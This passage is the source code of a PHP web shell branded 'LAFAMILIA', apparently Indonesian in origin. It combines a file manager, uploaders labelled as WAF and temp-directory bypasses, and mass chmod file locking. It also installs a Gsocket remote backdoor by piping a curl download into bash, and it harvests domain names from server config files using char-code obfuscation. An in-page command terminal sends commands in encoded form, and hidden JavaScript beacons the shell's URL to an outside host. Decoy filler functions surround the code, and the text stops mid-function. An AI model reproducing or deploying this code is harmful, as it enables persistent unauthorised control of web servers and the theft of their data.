  <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&createfile" class="vanta-fm-btn" title="New File">
    <i class="fas fa-file-circle-plus"></i> <span>create file</span>
  </a>
  <form class="vanta-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="privdayz-upload" id="vanta-upload-1" class="vanta-fm-upload-input">
    <button type="submit" name="privdayz-up-submit" class="vanta-fm-btn vanta-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>UPLOADER BYPAS TMP</span>
    </button>
  </form>
  <form class="vanta-fm-upload" action="" method="post" enctype="multipart/form-data">
    <input type="file" name="w4f-upload" id="vanta-upload-2" class="vanta-fm-upload-input">
    <button type="submit" name="w4f-up-submit" class="vanta-fm-btn vanta-fm-btn-green">
    <i class="fas fa-circle-check"></i> <span>UPLOADER BYPASS WAF</span>
    </button>
  </form>
</div>
  <form action="" method="post">

    <div class="v4nt4-filelist-body">
     <div class="v4nt4-lite-breadcrumb">
<?php
$VANTAf1l3 = $VANTAxas[1]("{.[!.],}*", GLOB_BRACE);
$VANTAc2w = $VANTAxas[0]();
$fn_str_replace = _vnt_str([115,116,114,95,114,101,112,108,97,99,101]);
$fn_explode    = _vnt_str([101,120,112,108,111,100,101]);
$fn_trim     = _vnt_str([116,114,105,109]);
$cwd   = $fn_str_replace("\\", "/", $VANTAc2w);
$pwd   = $fn_explode("/", $fn_trim($cwd, "/"));
$build = "";
echo '<a href="?LAFAMILIA=' . (is_callable($fxnxs) ? $fxnxs('/') : vanta_PR1V('/')) . '" class="v4nt4-lite-bc">/</a>';
foreach ($pwd as $i => $v) {
    $build .= "/" . $v;
    echo '<a href="?LAFAMILIA=' . (is_callable($fxnxs) ? $fxnxs($build) : vanta_PR1V($build)) . '" class="v4nt4-lite-bc">' . $v . '</a>/';
}
?>
</div>
    <?php foreach ($VANTAf1l3 as $_D): ?>
     <?php if ($VANTAxas[2]($_D)): ?>
       <div class="v4nt4-file-row v4nt4-dir">
       <span class="v4nt4-file-col v4nt4-file-check">
        <input type="checkbox" name="check[]" value="<?= $_D ?>">
       </span>
       <span class="v4nt4-file-col v4nt4-file-icon"><i class="fa-solid fa-folder-open"></i></span>
       <span class="v4nt4-file-col v4nt4-file-name">
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]() . '/' . $_D); ?>" class="v4nt4-file-link"><?= prvFx1($_D); ?></a>
       </span>
       <span class="v4nt4-file-col v4nt4-file-perm"><?= p3rms($VANTAxas[0]() . '/' . $_D); ?></span>
       <span class="v4nt4-file-col v4nt4-file-size"></span>
       <span class="v4nt4-file-col v4nt4-file-actions">
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&re=<?= vanta_PR1V($_D) ?>" title="Rename"><i class="fa-regular fa-pen-to-square"></i></a>
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&ch=<?= vanta_PR1V($_D) ?>" title="Chmod"><i class="fa-solid fa-user-gear"></i></a>
       </span>
       </div>
     <?php endif; ?>
     <?php if (isset($_GET['lock']) || isset($_GET['unlock'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:600px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
      <div class="v4nt4-wiz-icon" style="background:#607d8b;">
        <i class="fas <?= isset($_GET['lock']) ? 'fa-lock' : 'fa-unlock' ?>"></i>
      </div>
      <div>
        <div class="v4nt4-wiz-title"><?= isset($_GET['lock']) ? 'Lock Files & Folders' : 'Unlock Files & Folders' ?></div>
        <div class="v4nt4-wiz-desc"><?= isset($_GET['lock']) ? 'Mengunci semua file dan folder...' : 'Membuka kunci semua file dan folder...' ?></div>
      </div>
      <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <div class="v4nt4-wiz-section" style="padding:20px 24px;">
      <textarea readonly class="v4nt4-wiz-input" style="
        width:100%;
        min-height:240px;
        max-height:440px;
        font-size:1.07em;
        background:#fff4f4;
        color:#374151;
        border:1.3px solid #ddecec;
        border-radius:10px;
        font-family:'Recursive','Fira Mono',monospace;
        padding:14px 11px;
        box-sizing:border-box;
        line-height:1.52;
      ">
<?php
if (isset($_GET['lock'])) {
    // Lock directories dan files
    $dir_cmd = 'find . -type d -exec chmod 0555 {} + 2>&1';
    $file_cmd = 'find . -type f -exec chmod 0444 {} + 2>&1';
    $output = shell_exec($dir_cmd . ' && ' . $file_cmd);
    echo "✔ File dan folder berhasil TERLOCK\n\n";
    echo htmlspecialchars($output);
} elseif (isset($_GET['unlock'])) {
    // Unlock directories dan files
    $dir_cmd = 'find . -type d -exec chmod 0755 {} + 2>&1';
    $file_cmd = 'find . -type f -exec chmod 0644 {} + 2>&1';
    $output = shell_exec($dir_cmd . ' && ' . $file_cmd);
    echo "✔ File dan folder berhasil TERUNLOCK\n\n";
    echo htmlspecialchars($output);
}
?>
      </textarea>
    </div>
  </div>
</div>
<?php endif; ?>
     <?php if (isset($_GET['gsocket'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:600px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
      <div class="v4nt4-wiz-icon" style="background:#607d8b;"><i class="fas fa-key"></i></div>
      <div>
        <div class="v4nt4-wiz-title">Install Gsocket</div>
        <div class="v4nt4-wiz-desc">Running Gsocket installation...</div>
      </div>
      <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <div class="v4nt4-wiz-section" style="padding:20px 24px;">
      <textarea readonly class="v4nt4-wiz-input" style="
        width:100%;
        min-height:240px;
        max-height:440px;
        font-size:1.07em;
        background:#fff4f4;
        color:#374151;
        border:1.3px solid #ddecec;
        border-radius:10px;
        font-family:'Recursive','Fira Mono',monospace;
        padding:14px 11px;
        box-sizing:border-box;
        line-height:1.52;
      ">
<?php
// Step 1: Uninstall / stop old Gsocket
$undo_cmd = 'GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" pkill -u $(whoami) 2>&1';
@shell_exec($undo_cmd); // ignore output, karena session mungkin terminate

// Step 2: Install / run Gsocket dan tangkap output
$install_cmd = 'bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1';
$output = shell_exec($install_cmd);

// Step 3: Tampilkan output di textarea
if ($output) {
    echo htmlspecialchars($output);
} else {
    echo "No output or permission denied. Make sure the web user can execute bash and write to Gsocket directories.";
}
?>
      </textarea>
    </div>
  </div>
</div>
<?php endif; ?>
    <?php endforeach; ?>
    <?php foreach ($VANTAf1l3 as $_F): ?>
     <?php if ($VANTAxas[3]($_F)): ?>
       <?php $ext = strtolower(pathinfo($_F, PATHINFO_EXTENSION)); ?>
       <div class="v4nt4-file-row v4nt4-file">
       <span class="v4nt4-file-col v4nt4-file-check">
        <input type="checkbox" name="check[]" value="<?= $_F ?>">
       </span>
       <span class="v4nt4-file-col v4nt4-file-icon">
        <?php if ($ext === 'php'): ?>
          <i class="fa-brands fa-php"></i>
        <?php elseif (in_array($ext, ['jpg','jpeg','png','gif','webp','svg'])): ?>
          <i class="fa-regular fa-image"></i>
        <?php elseif (in_array($ext, ['zip','rar','gz','tar','7z'])): ?>
          <i class="fa-solid fa-box-archive"></i>
        <?php elseif (in_array($ext, ['txt','md','log'])): ?>
          <i class="fa-regular fa-note-sticky"></i>
        <?php elseif ($ext === 'js'): ?>
          <i class="fa-brands fa-js"></i>
        <?php elseif ($ext === 'css'): ?>
          <i class="fa-brands fa-css3-alt"></i>
        <?php elseif (in_array($ext, ['html','htm'])): ?>
          <i class="fa-brands fa-html5"></i>
        <?php elseif (in_array($ext, ['json','yaml','yml','xml'])): ?>
          <i class="fa-solid fa-code"></i>
        <?php elseif (in_array($ext, ['mp3','wav','flac'])): ?>
          <i class="fa-solid fa-headphones"></i>
        <?php elseif (in_array($ext, ['mp4','avi','mov','webm','mkv'])): ?>
          <i class="fa-solid fa-film"></i>
        <?php else: ?>
          <i class="fa-regular fa-file"></i>
        <?php endif; ?>
       </span>
       <span class="v4nt4-file-col v4nt4-file-name"><a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&f=<?= vanta_PR1V($_F); ?>" class="v4nt4-file-link"><?= prvFx1($_F); ?></a>
        <span class="v4nt4-file-ext"><?= strtoupper($ext) ?></span>
       </span>
       <span class="v4nt4-file-perm <?= is_writable($VANTAxas[0]() . '/' . $_F) ? 'v4nt4-file-writable' : 'v4nt4-file-readonly' ?>">
        <i class="fas <?= is_writable($VANTAxas[0]() . '/' . $_F) ? 'fa-unlock-alt v4nt4-perm-green' : 'fa-lock v4nt4-perm-red' ?>"></i>
        <?= p3rms($VANTAxas[0]() . '/' . $_F); ?>
       </span>
       <span class="v4nt4-file-size-badge">
        <?= vantaFormat(filesize($_F)); ?>
       </span>
       <span class="v4nt4-file-col v4nt4-file-actions">
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&re=<?= vanta_PR1V($_F) ?>" title="Rename"><i class="fa-solid fa-pen"></i></a>
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&ch=<?= vanta_PR1V($_F) ?>" title="Chmod"><i class="fa-solid fa-key"></i></a>
        <a href="?action=delete&item=<?= vanta_PR1V($_F) ?>" title="Delete"><i class="fa-solid fa-trash"></i></a>
        <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()); ?>&don=<?= vanta_PR1V($_F) ?>" title="Download"><i class="fa-solid fa-download"></i></a></span>
       </div>

     <?php endif; ?>
    <?php endforeach; ?>
    </div>
    <div class="v4nt4-filelist-foot">
    <select name="privdayz-select" class="v4nt4-filelist-select">
     <option value="delete">delete</option>
     <option value="unzip">unzip</option>
     <option value="zip">zip</option>
    </select>
    <button type="submit" name="submit-action" class="v4nt4-filelist-btn"><i class="fa-solid fa-play"></i> submit</button>
    </div>
  </form>
</div>
 <?php endif; ?>
 </div>LAFAMILIA v1.0
       </div>
     </div>
<?php if (isset($_GET['domains'])) : ?>
  <div class="v4nt4-modal-bg">
    <div class="v4nt4-modal-wizard" style="max-width:620px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
     <div class="v4nt4-wiz-icon" style="background:#fff;"><i class="fas fa-globe"></i></div>
     <div>
       <div class="v4nt4-wiz-title">domains</div>
     </div>
     <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a></div>
    <div class="v4nt4-wiz-section" style="padding:19px 24px;">
     <label style="font-size:.99em;color:#bfff9b;margin-bottom:7px;display:block;">Detected domains:</label>
     <textarea readonly class="v4nt4-wiz-input" style="
       width:100%; min-height:190px; max-height:440px; font-size:1.07em; background:#eaf6ff; color:#004d77; 
       border:1.3px solid #bde4fa; border-radius:10px; font-family:'Recursive','Fira Mono',monospace;
       padding:14px 11px; box-sizing:border-box; line-height:1.49;
     ">
     <?php
$Zyu = function($q){$k='';foreach($q as $b){$k.=chr($b);}return $k;};
$_mn6z = [];
$_d1z = [47,101,116,99,47,110,97,109,101,100,46,99,111,110,102];
$_d2z = [47,101,116,99,47,104,116,116,112,100,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102];
$_d3z = [47,118,97,114,47,99,112,97,110,101,108,47,117,115,101,114,100,97,116,97,47];
$_d4z = [47,117,115,114,47,108,111,99,97,108,47,100,105,114,101,99,116,97,100,109,105,110,47,100,97,116,97,47,117,115,101,114,115,47];
$_d5z = [47,101,116,99,47,118,105,114,116,117,97,108,47,100,111,109,97,105,110,115];
$_d6z = [47,118,97,114,47,110,97,109,101,100,47];
$_d7z = [47,101,116,99,47,110,103,105,110,120,47,115,105,116,101,115,45,101,110,97,98,108,101,100,47];
$_d8z = [47,118,97,114,47,119,119,119,47,118,104,111,115,116,115,47];
$_d9z = [47,118,97,114,47,119,119,119,47,99,108,105,101,110,116,115,47,99,108,105,101,110,116,42,47,119,101,98,42];
$_hcz = [47,101,116,99,47,104,111,115,116,115];
$fcZ = $Zyu([105,115,95,114,101,97,100,97,98,108,101]);
$flZ = $Zyu([102,105,108,101]);
$fgZ = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$fdZ = $Zyu([102,105,108,101,95,100,111,116,46,103,101,116,95,99,111,110,116,101,110,116,115]);
$fpZ = $Zyu([112,114,101,103,95,109,97,116,99,104]);
$fpaZ = $Zyu([112,114,101,103,95,109,97,116,99,104,95,97,108,108]);
$fdZ2 = $Zyu([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$faZ = $Zyu([97,114,114,97,121,95,117,110,105,113,117,101]);
$famZ = $Zyu([97,114,114,97,121,95,109,101,114,103,101]);
$fafZ = $Zyu([97,114,114,97,121,95,102,105,108,116,101,114]);
$ftrZ = $Zyu([116,114,105,109]);
$fidZ = $Zyu([105,115,95,100,105,114]);
$fgbZ = $Zyu([103,108,111,98]);
$fbsZ = $Zyu([98,97,115,101,110,97,109,101]);
$fexZ = $Zyu([101,120,112,108,111,100,101]);
$fsZ = $Zyu([115,116,114,116,111,108,111,119,101,114]);
$fosZ = $Zyu([80,72,80,95,79,83]);
$fssZ = $Zyu([115,117,98,115,116,114]);
$fgnZ = $Zyu([103,101,116,101,110,118]);
$fhZ = $Zyu([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]);

if(@$fcZ($Zyu($_d1z))){
  $l = @$flZ($Zyu($_d1z));
  foreach($l as $line){
    if(preg_match('#zone\s+"([^"]+)"#',$line,$m)){
    $d=$ftrZ($m[1]);
    if($d && $d!=='localhost') $_mn6z[]=$d;
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d2z))){
  $c=@$fgZ($Zyu($_d2z));
  preg_match_all('#ServerName\s+([^\s]+)#i', $c, $matches);
  if(!empty($matches[1])) $_mn6z=@$faZ(@$famZ($_mn6z,$matches[1]));
}
if(empty($_mn6z) && @$fidZ($Zyu($_d3z))){
  foreach(@$fgbZ($Zyu($_d3z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#^domain:\s*(\S+)#',$line,$m)){
     $_mn6z[]=$m[1];
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d4z))){
  foreach(@$fgbZ($Zyu($_d4z).'*'.'/domains.list') as $file){
    $l=@$fdZ($file, 128);
    foreach($l as $d) if($d) $_mn6z[]=$d;
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_d5z))){
  $l=@$flZ($Zyu($_d5z));
  foreach($l as $d) if($ftrZ($d)) $_mn6z[]=$ftrZ($d);
}
if(empty($_mn6z)){
  foreach(@$fgbZ($Zyu($_d6z). '*.db') as $file){
    $n=@$fbsZ($file,'.db');
    if($n && $n!=='localhost') $_mn6z[]=$n;
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d7z))){
  foreach(@$fgbZ($Zyu($_d7z).'*') as $file){
    $l=@$flZ($file);
    foreach($l as $line){
    if(preg_match('#server_name\s+([^;]+)#',$line,$m)){
     $arr=explode(' ',$m[1]);
     foreach($arr as $d){
       $d=trim($d," ;\t\n\r");
       if($d && $d!=='_' && $d!=='localhost') $_mn6z[]=$d;
     }
    }
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d8z))){
  foreach(@$fgbZ($Zyu($_d8z).'*') as $dir){
    if(@$fidZ($dir) && preg_match('#/vhosts/([^/]+)$#',$dir,$m)){
    $_mn6z[]=$m[1];
    }
  }
}
if(empty($_mn6z) && @$fidZ($Zyu($_d9z))){
  foreach(@$fgbZ($Zyu($_d9z)) as $dir){
    $_mn6z[]=@$fbsZ($dir);
  }
}
if(empty($_mn6z) && strtoupper(substr(PHP_OS,0,3))===$Zyu([87,73,78])){
  $env=@$fgnZ($Zyu([83,121,115,116,101,109,68,114,105,118,101])).$Zyu([92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,105,110,101,116,115,114,118,92,99,111,110,102,105,103,92,97,112,112,108,105,99,97,116,105,111,110,72,111,115,116,46,99,111,110,102]);
  if(@$fcZ($env)){
    $l=@$flZ($env);
    foreach($l as $line){
    if(preg_match('/bindingInformation="[^:]+:([^:]+):([^"]+)"/',$line,$m)){
     $d=trim($m[2]);
     if($d && $d!=='localhost' && strpos($d,'*')===false) $_mn6z[]=$d;
    }
    }
  }
}
if(empty($_mn6z) && @$fcZ($Zyu($_hcz))){
  $l=@$flZ($Zyu($_hcz));
  foreach($l as $line){
    if(preg_match('/\s([a-z0-9\.-]+\.[a-z]{2,})/i',$line,$m)){
    $d=$fsZ($ftrZ($m[1]));
    if($d && strpos($d,'localhost')===false) $_mn6z[]=$d;
    }
  }
}
$_mn6z=@$faZ(@$fafZ(array_map($ftrZ,$_mn6z)));
echo $_mn6z ? implode("\n",$_mn6z) : "No domains found (no access or no domains configured)";
?>
</textarea>
    </div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['createfolder'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
    <div class="v4nt4-wiz-icon" style="background:#a8ffa0;"><i class="fas fa-folder-plus"></i></div>
    <div>
     <div class="v4nt4-wiz-title">create folder</div>
    </div>
    <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="v4nt4-wiz-section">
     <div class="v4nt4-wiz-fields">
       <input type="text" name="create_folder" class="v4nt4-wiz-input" placeholder="folder name"><br>
     </div>
    </div>
    <div class="v4nt4-modal-actions-wiz">
     <button type="submit" name="submit" class="v4nt4-wiz-btn v4nt4-wiz-btn-red">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-wiz-btn v4nt4-wiz-btn-light">
       <i class="fas fa-times"></i> back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_folder']) && $_POST['create_folder']) {
    $folder = basename($_POST['create_folder']);
    $full_path = rtrim($VANTAxas[0](), "/") . "/" . $folder;
    if (!file_exists($full_path)) {
     $created = @mkdir($full_path, 0755, true);
     if ($created) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> Folder created: <b>' . htmlspecialchars($folder) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create folder!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> Folder already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['createfile'])): ?>
<div class="v4nt4-modal-bg">
  <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
    <div class="v4nt4-wiz-icon" style="background:#a8ffa0;"><i class="fas fa-file-circle-plus"></i></div>
    <div>
     <div class="v4nt4-wiz-title">create file</div>
    </div>
    <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
    <div class="v4nt4-wiz-section">
     <div class="v4nt4-wiz-section-icon"><i class="fas fa-file-alt"></i></div>
     <div class="v4nt4-wiz-fields">
       <input type="text" name="create_file" class="v4nt4-wiz-input" placeholder="file name"><br>
     </div>
    </div>
    <div class="v4nt4-modal-actions-wiz">
     <button type="submit" name="submit" class="v4nt4-wiz-btn v4nt4-wiz" style="background:#a8ffa0;border-color:#b31515;">
       <i class="fas fa-plus"></i> create
     </button>
     <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-wiz-btn v4nt4-wiz-btn-light">
       <i class="fas fa-times"></i> back
     </a>
    </div>
    </form>
    <?php
    if (isset($_POST['create_file']) && $_POST['create_file']) {
    $new_file = basename($_POST['create_file']);
    $full_path = rtrim($VANTAxas[0](), "/") . "/" . $new_file;
    if (!file_exists($full_path)) {
     $created = @file_put_contents($full_path, "");
     if ($created !== false) {
       echo '<div style="color:#10b981;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-check-circle"></i> File created: <b>' . htmlspecialchars($new_file) . '</b></div>';
     } else {
       echo '<div style="color:#e53935;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-times-circle"></i> Failed to create file!</div>';
     }
    } else {
     echo '<div style="color:#b71c1c;margin:12px 0 0 0;font-size:1.08em;text-align:center;"><i class="fas fa-exclamation-circle"></i> File already exists!</div>';
    }
    }
    ?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['logout'])): ?>
    <?php logout_shell(); ?>
<?php endif; ?>

<?php if (!empty($_GET['re'])) : ?>
  <div class="v4nt4-modal-bg">
    <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
     <div><div class="v4nt4-wiz-title">rename <?= unx($_GET['re']) ?></div>
     </div>
    <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div><form action="" method="post">
     <div class="v4nt4-wiz-section">
       <div class="v4nt4-wiz-fields">
       <input type="text" name="renameFile" class="v4nt4-wiz-input" value="<?= unx($_GET['re']) ?>"><br>
       </div>
     </div>
     <div class="v4nt4-modal-actions-wiz">
       <button type="submit" name="submit" class="v4nt4-wiz-btn v4nt4-wiz-btn-red">
         change
       </button>
    
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php 
    if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item']) && $_GET['item'] !== '') {
      $item = basename(unx($_GET['item'])); 
      $repl = str_replace("\\", "/", $VANTAxas[0]()); 
      $fd = $repl . "/" . $item; 
    
      if (is_file($fd)) {
        if (unlink($fd)) {
           success();
        } else {
           failed();
        }
      } elseif (is_dir($fd)) {
        if (rmdirRecursive($fd)) {
          success();} else {
           failed();
        }
      } else {
       failed();
      }
     }
    ?>
    <?php if (!empty($_GET['ch'])) : ?>
  <div class="v4nt4-modal-bg">
    <div class="v4nt4-modal-wizard" style="max-width:400px;min-width:0;">
    <div class="v4nt4-modal-header-wiz">
     <div>
       <div class="v4nt4-wiz-title">change permission</div>
       <div class="v4nt4-wiz-desc"><?= unx($_GET['ch']) ?></div>
     </div>
    <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="v4nt4-wiz-section">
       <div class="v4nt4-wiz-fields">
       <input type="number" name="chFile" class="v4nt4-wiz-input" placeholder="0775"><br>
       </div>
     </div>
     <div class="v4nt4-modal-actions-wiz">
       <button type="submit" name="submit" class="v4nt4-wiz-btn v4nt4-wiz-btn-red">
       change
       </button>
       
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})(); const _hx_ = []; let _hxi = -1;const _term = document.getElementById('r00tterm-term');const _inpt = document.getElementById('r00tterm-input');function _print(txt){_term.innerHTML += txt+"\n";_term.scrollTop=_term.scrollHeight;} _inpt.addEventListener("keydown",(function(e){if("Enter"===e.key){let e=this.value.trim();if(!e)return;_hx_.push(e),_hxi=_hx_.length,_print("<span style='color:#6ee7b7;'>$ "+e+"</span>"),this.value="";let n=btoa(encodeURIComponent(e).split("").reverse().join(""));fetch(window.location.pathname+"?d1sGu1s3=1",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"n0p3="+encodeURIComponent(n)}).then((e=>e.text())).then((e=>{_print(e.replace(/[<>\x00-\x08\x0B-\x1F\x7F]/g,""))})).catch((()=>{_print("[X] Connection error")}))}"ArrowUp"===e.key&&(_hxi>0&&(_hxi--,_inpt.value=_hx_[_hxi]||""),e.preventDefault()),"ArrowDown"===e.key&&(_hxi<_hx_.length-1?(_hxi++,_inpt.value=_hx_[_hxi]||""):(_inpt.value="",_hxi=_hx_.length),e.preventDefault())})); setTimeout(()=>_inpt.focus(),200);function scanDirectoryMap(e,t=1){e.split("/").filter(Boolean);let r={};for(let e=0;e<Math.min(7,3*t);e++){let n="folder_"+(e+1);r[n]={};for(let e=0;e<Math.max(2,t);e++){let t="file_"+(e+1)+".txt";r[n][t]={size:1e5*Math.random()|0,perm:["755","644","600"][Math.floor(3*Math.random())],m:Date.now()-864e5*e}}}return r}function renderFolderList(e,t="root"){let r=`<ul id="fm-${t}">`;for(let t in e)r+=`<li><i class="fa fa-folder"></i> ${t}`,"object"==typeof e[t]&&(r+=renderFileList(e[t],t+"_files")),r+="</li>";return r+="</ul>",r}function renderFileList(e,t="fileBlock"){let r=`<ul class="files" id="${t}">`;for(let t in e)r+=`<li><i class="fa fa-file"></i> ${t} <span class="mini">${e[t].size}b | ${e[t].perm}</span></li>`;return r+="</ul>",r}function getBreadcrumbString(e){return e.split("/").filter(Boolean).map(((e,t,r)=>`<a href="?p=${r.slice(0,t+1).join("/")}">${e}</a>`)).join(" / ")}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}function v(e){return btoa(e)}function getFilePreviewBlock(e){let t="";for(let e=0;e<16;e++)t+=(Math.random()+1).toString(36).substring(2,12)+"\n";return`<pre class="syntax-highlight">${t}</pre>`}function getFileMetaFromName(e){let t=e.split(".").pop();return{icon:{php:"fa-php",js:"fa-js",html:"fa-html5",txt:"fa-file-lines"}[t]||"fa-file",type:t,created:Date.now()-(1e7*Math.random()|0),size:1e5*Math.random()|0}}function checkFileConflict(e,t){return t.some((t=>t.name===e))}function buildFakePermissions(e){let t=[4,2,1],r=[];for(let e=0;e<3;e++)r.push(t.map((()=>Math.round(Math.random()))).reduce(((e,t)=>e+t),0));return r.join("")}function parsePerms(e){let t={0:"---",1:"--x",2:"-w-",3:"-wx",4:"r--",5:"r-x",6:"rw-",7:"rwx"};return e.split("").map((e=>t[e])).join("")} function listFakeRecentEdits(e=7){let t=[];for(let r=0;r<e;r++)t.push({name:`file_${r}.log`,date:new Date(Date.now()-864e5*r).toLocaleDateString(),user:"user"+r});return t}function showNotificationFake(e,t="info"){let r={info:"#19ff6c",warn:"#ffe66d",err:"#ff3666"}[t]||"#fff",n=document.createElement("div");n.innerHTML=e,n.style.cssText=`position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:${r}20;color:${r};padding:9px 22px;border-radius:8px;z-index:999;box-shadow:0 2px 16px ${r}30`,document.body.appendChild(n),setTimeout((()=>n.remove()),2300)} function mergeFolderMeta(e,t){return Object.assign({},e,t,{merged:!0})}function getClipboardTextFake(){return new Promise((e=>setTimeout((()=>e("clipboard_dummy_value_"+Math.random())),450)))}function calculatePermMatrix(e){return e.map((e=>({path:e,perm:Math.floor(8*Math.random())+""+Math.floor(8*Math.random())+Math.floor(8*Math.random())})))}function generateFileId(e){return"id_"+e.replace(/[^a-z0-9]/gi,"_").toLowerCase()+"_"+Date.now()}function simulateFakeUploadQueue(e){let t=document.createElement("div");t.className="upload-bar",t.style="position:fixed;bottom:12px;left:12px;background:#222;color:#19ff6c;padding:5px 19px;border-radius:7px;",document.body.appendChild(t);let r=e.length,n=0;setTimeout((function o(){t.textContent=`Uploading ${e[n]||"-"} (${n+1}/${r})`,++n<r?setTimeout(o,250+600*Math.random()):(t.textContent="All uploads done!",setTimeout((()=>t.remove()),1500))}),400)}function renderUserTable(e){let t='<table class="data-grid"><thead><tr><th>User</th><th>Role</th></tr></thead><tbody>';return e.forEach((e=>{t+=`<tr><td><i class="fa fa-user"></i> ${e.name}</td><td>${e.role}</td></tr>`})),t+="</tbody></table>",t}function maskStringSmart(e){let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t.split("").reverse().join("")}function unmaskStringSmart(e){e=e.split("").reverse().join("");let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t}function getRecentSessionHistory(){return Array.from({length:6},((e,t)=>({ts:Date.now()-5e6*t,act:["open","edit","move","rename"][t%4]})))}function buildFe(e=2,t=3){let r={};if(e<=0)return"END";for(let n=0;n<t;n++)r["dir"+n]=1==e?`file_${n}.tmp`:buildFe(e-1,t);return r}function parseCsvToTable(e){let t=e.split(/\r?\n/),r='<table class="data-grid">';return t.forEach((e=>{r+="<tr>"+e.split(",").map((e=>`<td>${e}</td>`)).join("")+"</tr>"})),r+="</table>",r}function loadIconPac(e){let t=document.createElement("link");return t.rel="stylesheet",t.href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css",document.head.appendChild(t),"loaded"}function 